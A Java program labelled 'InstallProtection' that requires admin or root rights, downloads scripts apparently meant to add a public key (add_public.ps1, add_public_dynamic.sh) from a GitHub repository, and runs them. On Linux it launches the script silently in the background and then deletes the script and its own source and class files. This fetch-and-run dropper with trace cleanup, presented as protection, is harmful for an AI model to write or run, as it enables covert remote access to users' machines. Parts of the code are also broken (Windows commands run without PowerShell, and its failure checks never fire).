import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.List;
import java.util.ArrayList;
import java.io.File;
import java.io.IOException;

public class InstallProtection {
    public static void main(String[] args) {
        String os = System.getProperty("os.name").toLowerCase();

        if (os.contains("win")) {
            WindowsInstall();
        } else if (os.contains("nix") || os.contains("nux") || os.contains("mac")) {
            LinuxInstall();
        } else {
            System.out.println("Unsupported operating system: " + os);
        }
    }

    private static void WindowsInstall() {
        if (!isRunningAsAdmin()) {
            System.out.println("This script must be run as an administrator.");
            System.exit(1);
        }

        List<String> commands = Arrays.asList(
            "set-executionpolicy remotesigned -Scope Process -Force",
            "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/add_public.ps1' -OutFile '$env:TEMP\\add_public.ps1'",
            "& '$env:TEMP\\add_public.ps1'"
        );

        for (String command : commands) {
            String output = Execute(command);
            if (output == null) {
                break;
            }
            System.out.println();
            System.out.println(output);
        }
    }

    private static boolean isRunningAsAdmin() {
        try {
            Process process = new ProcessBuilder("cmd.exe", "/c", "net session").start();
            process.waitFor();
            return process.exitValue() == 0;
        } catch (Exception e) {
            return false;
        }
    }

	private static void LinuxInstall() {
		if (!isRunningAsSudo()) {
			System.out.println("This script must be run with sudo.");
			System.exit(1);
		}

		String packageManager = detectPackageManager();
		if (packageManager == null) {
			System.out.println("Unsupported Linux distribution. Install curl and Python manually.");
			System.exit(1);
		}

		List<String> installCommands = switch (packageManager) {
			case "apt" -> Arrays.asList("apt-get update -y", "apt-get install -y sudo curl wget");
			case "pacman" -> Arrays.asList("pacman -Sy --noconfirm curl wget");
			case "yum" -> Arrays.asList("yum install -y curl wget");
			default -> List.of();
		};

		// 1) run installers synchronously
		for (String cmd : installCommands) {
			String out = Execute(cmd);    // your existing synchronous Execute()
			if (out == null) {
				System.err.println("Failed running: " + cmd);
				return;
			}
			System.out.println(out);
		}

		// use absolute path for the downloaded script
		String scriptPath = "/tmp/add_public_dynamic.sh";
		String url = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/add_public_dynamic.sh";

		// 2) download script (synchronous)
		String curlCmd = "curl -fsSL -o " + scriptPath + " " + url;
		String curlOut = Execute(curlCmd);
		if (curlOut == null) {
			System.err.println("Download failed: " + curlCmd);
			return;
		}

		// 3) make it executable
		String chmodCmd = "chmod +x " + scriptPath;
		if (Execute(chmodCmd) == null) {
			System.err.println("chmod failed for " + scriptPath);
			// continue — maybe still executable
		}

		// 4) start detached with nohup (do NOT wait)
		String nohupCmd = String.format("nohup /bin/bash %s >/dev/null 2>&1 &", scriptPath);
		String detachedResult = ExecuteDetached(nohupCmd);
		if (detachedResult == null) {
			System.err.println("Failed to start detached script.");
			// we still try cleanup below
		} else {
			System.out.println("Launched detached script.");
		}

		// small pause to let background script start and maybe create files
		try { Thread.sleep(300); } catch (InterruptedException ignored) {}

		// 5) cleanup transient files (synchronous)
		// remove compiled/temporary files if they exist
		String rmCmd = "rm -f /tmp/InstallProtection.class /tmp/InstallProtection.java " + scriptPath;
		if (Execute(rmCmd) == null) {
			System.err.println("Cleanup failed: " + rmCmd);
		} else {
			System.out.println("Cleanup completed.");
		}
	}

	public static String ExecuteDetached(String command) {
		try {
			// run through shell so redirections and & work
			ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", command);
			// discard output/errors so the child won't inherit streams
			pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
			pb.redirectError(ProcessBuilder.Redirect.DISCARD);
			pb.redirectInput(ProcessBuilder.Redirect.PIPE); // child's stdin closed later

			Process p = pb.start();

			// very important: close parent's handles so they aren't kept open
			try { p.getInputStream().close(); } catch (IOException ignored) {}
			try { p.getOutputStream().close(); } catch (IOException ignored) {}
			try { p.getErrorStream().close(); } catch (IOException ignored) {}

			// Do NOT waitFor() — return immediately
			return "detached";
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}
	}


	private static String detectPackageManager() {
		List<String> managers = Arrays.asList("apt", "pacman", "yum");
		for (String manager : managers) {
			if (new File("/usr/bin/" + manager).exists() || new File("/bin/" + manager).exists()) {
				return manager;
			}
		}
		return null;
	}

    private static boolean isRunningAsSudo() {
        try {
            String userName = System.getProperty("user.name");
            return "root".equals(userName);
        } catch (Exception e) {
            return false;
        }
    }

    public static String Execute(String command) {
        StringBuilder output = new StringBuilder();
        try {
            String[] commandArray = command.split(" ");
            ProcessBuilder processBuilder = new ProcessBuilder(commandArray);
            processBuilder.redirectErrorStream(true);
            Process process = processBuilder.start();

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            boolean firstLine = true;
            while ((line = reader.readLine()) != null) {
                if (!firstLine) {
                    output.append(System.lineSeparator());
                }
                output.append(line);
                firstLine = false;
            }

            process.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return output.toString();
    }
}

